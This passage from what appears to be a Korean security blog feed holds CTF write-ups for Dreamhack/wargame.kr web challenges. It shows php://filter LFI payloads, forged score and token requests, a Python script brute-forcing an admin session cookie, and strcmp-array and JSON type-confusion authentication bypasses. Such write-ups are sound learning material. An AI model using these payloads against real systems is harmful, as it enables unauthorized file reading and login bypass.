  <li>get 요청 파라미터로 확장자를 뺀 이름을 넣어주면 <code class="language-plaintext highlighter-rouge">include 파일이름.php</code> 가 include 되는 것을 확인할 수 있다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="o">?</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">]</span><span class="mf">.</span><span class="s1">'.php'</span><span class="o">:</span><span class="s1">'main.php'</span><span class="p">;</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<h3 id="php-프로토콜의-filter-기능을-이용한-공격-payload">php 프로토콜의 filter 기능을 이용한 공격 Payload</h3>
<ul>
  <li>
    <p>filter 기능을 이용하면 파일 내용을 먼저 필터링 처리한 다음 php 파일로서 실행이 된다.</p>
  </li>
  <li>방법 1.  <code class="language-plaintext highlighter-rouge">convert.base64-encode</code> 이용하기</li>
  <li>이렇게 하면 flag.php 파일 내용이 먼저 base64 로 인코딩을 한 다음 php 파일로서 실행이 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?page=php://filter/read=convert.base64-encode/resource=/var/www/uploads/flag
</code></pre></div></div>

<ul>
  <li>방법 2. <code class="language-plaintext highlighter-rouge">string.rot13</code></li>
  <li>이렇게 하면 flag.php 파일 내용이 먼저 rot13 로 인코딩을 한 다음 php 파일로서 실행이 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?page=php://filter/read=string.rot13/resource=/var/www/uploads/flag
</code></pre></div></div>

<ul>
  <li>인코딩된 데이터를 사용자는 받을 수 있기 때문에 파일 내용을 확인하기 위해서는 디코딩 작업을 해주면 된다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://www.php.net/manual/en/wrappers.php">php 프로토콜</a></li>
  <li><a href="https://www.php.net/manual/en/filters.php">php 에서 지원하는 필터</a></li>
  <li><a href="https://rot13.com/">rot13 디코더</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="include" /><category term="wrapper" /><summary type="html"><![CDATA[PHP LFI 문제 풀이]]></summary></entry><entry><title type="html">[wargame.kr] fly me to the moon 문제</title><link href="http://localhost:4000/dreamhack/fly_me_to_the_moon/" rel="alternate" type="text/html" title="[wargame.kr] fly me to the moon 문제" /><published>2023-08-28T00:00:00+09:00</published><updated>2023-08-28T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/fly_me_to_the_moon</id><content type="html" xml:base="http://localhost:4000/dreamhack/fly_me_to_the_moon/"><![CDATA[<p><a href="https://dreamhack.io/wargame/challenges/324">문제</a></p>

<h2 id="요청-위조-방법-1">요청 위조 (방법 1)</h2>
<ul>
  <li>게임이 완료되고 요청하는 점수와 토큰 값을 위조해주면 된다.</li>
</ul>

<h3 id="분석">분석</h3>
<ul>
  <li>token 값을 일정 주기로 받아오는 것을 확인할 수 있다.</li>
  <li>게임 완료 시 토큰 값과 게임 점수를 같이 전송하는 것을 확인할 수 있다.</li>
  <li>게임을 시작할 때는 token 값을 안 받아오는 것을 확인할 수 있었다.</li>
</ul>

<h3 id="공격">공격</h3>
<ul>
  <li>burp suite 의 intercept 기능을 이용하여 31337 이상으로 만들어 요청을 보내주면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>token=9355&amp;score=3000000
</code></pre></div></div>

<h2 id="javascript-위조-방법-2">javascript 위조 (방법 2)</h2>
<ul>
  <li>js 방어법을 우회하는 방법을 이용하였다.</li>
  <li>javascipt 를 이용한 게임이기 때문에 javascipt 코드를 위조하여 점수를 마음대로 바꿀 수 있다.</li>
  <li>js 코드를 분석해 보면 사람이 못 알아보게 encode 되어 있는 것을 확인할 수 있다.</li>
  <li>따라서 사람이 알아볼 수 있게 <code class="language-plaintext highlighter-rouge">de4js</code> 를 이용하여 decode 를 진행해 주었다.</li>
</ul>

<h3 id="코드-위조">코드 위조</h3>
<ul>
  <li>코드를 보면 다음 위치에서 점수를 서버로 보내는 것을 확인할 수 있다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">if </span><span class="p">(</span><span class="nx">BTunnelGame</span><span class="p">.</span><span class="nf">checkLife</span><span class="p">())</span> <span class="p">{</span>
        <span class="nf">setTimeout</span><span class="p">(</span><span class="dl">'</span><span class="s1">updateTunnel()</span><span class="dl">'</span><span class="p">,</span> <span class="mi">10</span><span class="p">)</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">img#ship</span><span class="dl">'</span><span class="p">).</span><span class="nf">fadeOut</span><span class="p">(</span><span class="dl">'</span><span class="s1">slow</span><span class="dl">'</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">img.left_wall</span><span class="dl">'</span><span class="p">).</span><span class="nf">css</span><span class="p">(</span><span class="dl">'</span><span class="s1">display</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">);</span>
        <span class="nf">$</span><span class="p">(</span><span class="dl">'</span><span class="s1">img.right_wall</span><span class="dl">'</span><span class="p">).</span><span class="nf">css</span><span class="p">(</span><span class="dl">'</span><span class="s1">display</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">none</span><span class="dl">'</span><span class="p">);</span>
        <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
            <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">high-scores.php</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">data</span><span class="p">:</span> <span class="dl">'</span><span class="s1">token=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;score=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">BTunnelGame</span><span class="p">.</span><span class="nf">getScore</span><span class="p">(),</span>
            <span class="na">success</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">showHighScores</span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">})</span>
    <span class="p">}</span>
<span class="p">};</span>
</code></pre></div></div>

<ul>
  <li><code class="language-plaintext highlighter-rouge">score=</code> 부분의 점수를 위조해주면 된다.</li>
</ul>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>        <span class="nx">$</span><span class="p">.</span><span class="nf">ajax</span><span class="p">({</span>
            <span class="na">type</span><span class="p">:</span> <span class="dl">'</span><span class="s1">POST</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">url</span><span class="p">:</span> <span class="dl">'</span><span class="s1">high-scores.php</span><span class="dl">'</span><span class="p">,</span>
            <span class="na">data</span><span class="p">:</span> <span class="dl">'</span><span class="s1">token=</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">token</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp;score=</span><span class="dl">'</span> <span class="o">+</span> <span class="mi">3000000</span><span class="p">,</span>
            <span class="na">success</span><span class="p">:</span> <span class="nf">function </span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">showHighScores</span><span class="p">(</span><span class="nx">_0x8618x19</span><span class="p">)</span>
            <span class="p">}</span>
        <span class="p">})</span>
</code></pre></div></div>

<ul>
  <li>이렇게 위조하여 완성 js 코드를 intercept 기능을 이용하여 원래 코드를 지우고 위조 코드를 붙여 넣어주면 된다.</li>
</ul>

<h2 id="비-정상-요청-방법-3">비 정상 요청 (방법 3)</h2>
<ul>
  <li>분석 결과 token 요청 후 받은 토큰 값과 점수를 같이 서버로 보낸다.</li>
</ul>

<h3 id="공격-1">공격</h3>
<ul>
  <li>먼저 토큰 값을 get 요청으로 받아준다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://서버 주소/token.php
</code></pre></div></div>

<ul>
  <li>그 다음 위에서 받은 토큰 값과 점수를 POST 요청으로 보내주면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://서버 주소/high-scores.php

token=토큰 값&amp;score=30000000000
</code></pre></div></div>

<ul>
  <li>여기서 GET 요청 할 때 와 POST 요청할 때의 PHPSESSID 쿠키 값이 같아야 한다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://lelinhtinh.github.io/de4js/">de4js</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="js" /><category term="request" /><summary type="html"><![CDATA[fly me to the moon 문제 풀이.]]></summary></entry><entry><title type="html">[wargame.kr] session id 쿠키 값 위조 문제</title><link href="http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0/" rel="alternate" type="text/html" title="[wargame.kr] session id 쿠키 값 위조 문제" /><published>2023-08-28T00:00:00+09:00</published><updated>2023-08-29T00:13:00+09:00</updated><id>http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0</id><content type="html" xml:base="http://localhost:4000/dreamhack/session_%EC%9C%84%EC%A1%B0/"><![CDATA[<p><a href="https://dreamhack.io/wargame/challenges/266">문제</a></p>

<h2 id="session-값-위조">Session 값 위조</h2>
<ul>
  <li>session 값을 admin 아이디가 저장된 세션 값으로 바꿔주면 된다.</li>
</ul>

<h3 id="코드-분석">코드 분석</h3>
<ul>
  <li>admin 계정의 session id 값의 범위는 00 ~ FF 인 것을 확인할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">session_storage</span><span class="p">[</span><span class="n">os</span><span class="p">.</span><span class="nf">urandom</span><span class="p">(</span><span class="mi">1</span><span class="p">).</span><span class="nf">hex</span><span class="p">()]</span> <span class="o">=</span> <span class="s">'admin'</span>
</code></pre></div></div>

<h3 id="공격-payload">공격 Payload</h3>
<ul>
  <li>만들어 질 수 있는 모든 session id 값을 쿠키에 넣어주면 된다.</li>
  <li>00 ~ FF 를 모두 sessionid 쿠키 값에 넣어주면서 admin 에 해당하는 session id 값을 찾아주면 된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">"공격 주소"</span>
<span class="n">COOKIE</span> <span class="o">=</span> <span class="p">{</span><span class="s">"sessionid"</span><span class="p">:</span><span class="s">""</span><span class="p">}</span>

<span class="k">def</span> <span class="nf">request</span><span class="p">()</span><span class="o">-&gt;</span><span class="nb">str</span><span class="p">:</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">URL</span><span class="p">,</span><span class="n">cookies</span><span class="o">=</span><span class="n">COOKIE</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">res</span><span class="p">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">find_sessionid</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
        <span class="c1"># print(str(hex(i)).replace('0x','').zfill(2))
</span>        <span class="n">COOKIE</span><span class="p">[</span><span class="s">"sessionid"</span><span class="p">]</span><span class="o">=</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">t</span> <span class="o">=</span> <span class="nf">request</span><span class="p">()</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
        <span class="k">if</span> <span class="s">'admin'</span> <span class="ow">in</span> <span class="n">t</span><span class="p">.</span><span class="nf">lower</span><span class="p">():</span>
            <span class="nf">print</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="nf">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)).</span><span class="nf">replace</span><span class="p">(</span><span class="s">'0x'</span><span class="p">,</span><span class="s">''</span><span class="p">).</span><span class="nf">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">))</span>
            <span class="k">break</span>
    <span class="k">return</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="c1"># request()
</span>    <span class="nf">find_sessionid</span><span class="p">()</span>
    <span class="k">return</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="nf">main</span><span class="p">()</span>

</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="session" /><summary type="html"><![CDATA[session 위조 문제 풀이.]]></summary></entry><entry><title type="html">[wargame.kr]php v5.3 strcmp 취약점 문제</title><link href="http://localhost:4000/dreamhack/php_5_3_strcmp/" rel="alternate" type="text/html" title="[wargame.kr]php v5.3 strcmp 취약점 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_5_3_strcmp</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_5_3_strcmp/"><![CDATA[<h2 id="strcmp-취약점">strcmp 취약점</h2>
<ul>
  <li>php 버전 5.3 에서 발생한 취약점이다.</li>
  <li>strcmp 에 Array 와 string을 넣어 비교할 때 발생하는 취약점이다.</li>
</ul>

<h3 id="array-로-입력받기">Array 로 입력받기</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test[]=aa
</code></pre></div></div>

<ul>
  <li>php 에서 해당 요청을 받으면 array 형태로 받는 것을 확인할 수 있다.</li>
</ul>

<h3 id="취약점-활용">취약점 활용</h3>
<ul>
  <li><code class="language-plaintext highlighter-rouge">strcmp(Array(),string)</code> 을 비교하면 null 값을 리턴한다.</li>
  <li><code class="language-plaintext highlighter-rouge">null==0</code> 을 비교하면 true 가 된다.</li>
</ul>

<h3 id="문제">문제</h3>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/328">문제</a></li>
  <li><code class="language-plaintext highlighter-rouge">strcmp($_POST['password'], $password) == 0</code> 이 true 여야 flag 값을 받아볼 수 있다.</li>
  <li>이 때 strcmp(Array(), string) 일 때 null 값을 반환하게 된다.</li>
  <li>그리고 <code class="language-plaintext highlighter-rouge">null == 0</code> 은 true 이기 때문에 flag 값을 받아볼 수 있다.</li>
</ul>

<h3 id="공격-payload">공격 payload</h3>
<ul>
  <li>array 형태로 요청을 보내주면 된다.</li>
</ul>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password[]=123
</code></pre></div></div>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="sqli" /><summary type="html"><![CDATA[php v5.3 strcmp 취약점에 대하여 알아보자.]]></summary></entry><entry><title type="html">[wargame.kr]php type confusion 문제</title><link href="http://localhost:4000/dreamhack/php_typeconfusion/" rel="alternate" type="text/html" title="[wargame.kr]php type confusion 문제" /><published>2023-08-27T00:00:00+09:00</published><updated>2023-08-27T23:13:00+09:00</updated><id>http://localhost:4000/dreamhack/php_typeconfusion</id><content type="html" xml:base="http://localhost:4000/dreamhack/php_typeconfusion/"><![CDATA[<h2 id="php-형-변환">PHP 형 변환</h2>
<ul>
  <li><a href="https://dreamhack.io/wargame/challenges/329">문제</a></li>
  <li>서로 비교할 때 비교 각 대상의 타입이 일치하지 않아 발생하는 취약점이다.</li>
  <li>php 의 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 비교를 진행할 때 발생한다.</li>
  <li>json 로 입력을 받을 때 발생할 수 있다.</li>
</ul>

<h3 id="문제-분석">문제 분석</h3>
<ul>
  <li>json 형태로 입력을 받아 디코드 한다.</li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$json</span> <span class="o">=</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'json'</span><span class="p">]);</span>
</code></pre></div></div>

<ul>
  <li>
    <p>json 형태로 넘겨줄 때 공격자는 타입을 정수형 또는 boolean 형 또는 string 형으로 넘겨줄 수 있다.</p>
  </li>
  <li>
    <p>현재 여기서 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 두 개의 값이 같은지만을 확인한다.</p>
  </li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="nv">$json</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">==</span> <span class="nv">$key</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>즉 자동으로 형 <code class="language-plaintext highlighter-rouge">$key</code> 값이 앞의 비교하는 형식으로 변환이 되는 취약점을 가지고 있다.</li>
</ul>

<h3 id="테스트">테스트</h3>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">"dsf"</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>true를 출력하는 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/263522608-064bd56d-02fe-47a1-9dd9-e66fcf4b79b7.png" alt="Pasted image 20230827192833" /></li>
</ul>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span><span class="nv">$a</span> <span class="o">==</span> <span class="s2">""</span><span class="p">){</span>
        <span class="k">echo</span> <span class="s2">"true"</span><span class="p">;</span>
<span class="p">}</span><span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"false"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<ul>
  <li>
    <p>false 를 출력하는 것을 확인할 수 있다.<br /><img src="https://user-images.githubusercontent.com/31990118/263522737-f1863132-0b67-47f0-9daa-7be5ecec854e.png" alt="Pasted image 20230827193102" /></p>
  </li>
  <li>
    <p>즉 <code class="language-plaintext highlighter-rouge">""</code> 아무것도 없을 때는 false 로 타입 변환이 일어나고 <code class="language-plaintext highlighter-rouge">"asdf"</code> 임의의 글자가 있을 때는 true 로 타입 변환이 되는 것을 확인할 수 있다.</p>
  </li>
</ul>

<h3 id="공격-페이로드">공격 페이로드</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>json={"key":true}

if($json-&gt;key == "xyz") 비교 하면
"xyz" =&gt; true 로 형 변환이 일어난다.
</code></pre></div></div>

<h3 id="대응-방안">대응 방안</h3>

<ul>
  <li>php 에서 두개의 값을 비교할 때 <code class="language-plaintext highlighter-rouge">==</code> 을 이용하여 값 만 비교하는 것이 아닌 <code class="language-plaintext highlighter-rouge">===</code> 을 사용하여 값과 타입을 모두 비교하도록 해주면 된다.</li>
</ul>

<h2 id="참고-사이트">참고 사이트</h2>
<ul>
  <li><a href="https://m.blog.naver.com/wnsdnakdhkd6/221976728186">php type confusion</a></li>
</ul>]]></content><author><name>Jung MinGyu</name></author><category term="dreamhack" /><category term="wargame" /><category term="php" /><category term="type confusion" /><summary type="html"><![CDATA[type confusion 을 통해 if 문 인증을 우회할 수 있다.]]></summary></entry></feed>